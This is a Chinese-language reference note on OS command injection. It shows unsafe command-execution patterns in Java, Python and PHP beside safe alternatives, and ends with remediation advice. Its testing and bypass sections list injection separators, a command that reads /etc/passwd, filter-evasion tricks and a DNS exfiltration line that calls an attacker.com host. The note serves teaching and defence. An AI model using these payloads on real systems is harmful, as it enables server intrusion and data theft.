# OS 命令注入原理与知识

## 概述

OS 命令注入 (OS Command Injection) 发生在应用程序将用户输入直接传递给系统命令执行函数时。攻击者可以注入额外的系统命令，从而在服务器上执行任意操作，包括文件读写、网络访问、权限提升等。

## 触发条件

1. **用户输入拼接到系统命令中**
2. **使用不安全的命令执行函数**
3. **缺乏输入过滤和命令参数分离**

## 常见模式

### Java 中的危险模式

```java
// 危险：Runtime.exec 拼接命令
Runtime.getRuntime().exec("ping " + ipAddress);

// 危险：ProcessBuilder 拼接
ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "nslookup " + domain);

// 安全：使用数组分离命令和参数
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ipAddress);
```

### Python 中的危险模式

```python
# 危险：os.system 拼接
os.system("ping " + ip_address)

# 危险：subprocess.call shell=True
subprocess.call("nslookup " + domain, shell=True)

# 危险：subprocess.Popen shell=True
subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

# 安全：使用列表参数，shell=False
subprocess.run(["ping", "-c", "4", ip_address], shell=False)
```

### PHP 中的危险模式

```php
// 危险：直接拼接
system("ping " . $ip);
exec("nslookup " . $domain, $output);
passthru("cat " . $filename);
```

## POC 验证要点

1. **命令分隔符**: `;`, `&&`, `||`, `|`, `%0A`, `%0D`
2. **反引号注入**: `` `whoami` ``
3. **管道符**: `cmd1 | cmd2`
4. **常见测试命令**: `whoami`, `id`, `uname -a`, `cat /etc/passwd`
5. **时间延迟**: `ping -c 5 127.0.0.1`, `sleep 5`
6. **Windows 特有**: `& dir`, `& whoami`, `| net user`

## 绕过技术

- **编码绕过**: Base64 编码命令, URL 编码分隔符
- **空格绕过**: `$IFS`, `{cmd,}`, `<` 重定向
- **引号绕过**: 单引号/双引号交替, 反斜杠转义
- **黑名单绕过**: `wh""oami`, `w${x}hoami`
- **无回显注入**: DNS 外带 `$(nslookup $(whoami).attacker.com)`

## 修复建议

- **避免命令执行**: 优先使用内置库函数替代系统命令
- **参数分离**: 使用参数数组而非字符串拼接命令
- **输入验证**: 白名单验证 IP、域名等格式
- **沙箱隔离**: 限制进程权限，使用最小权限原则
- **禁用危险函数**: 关闭 `shell=True` 选项
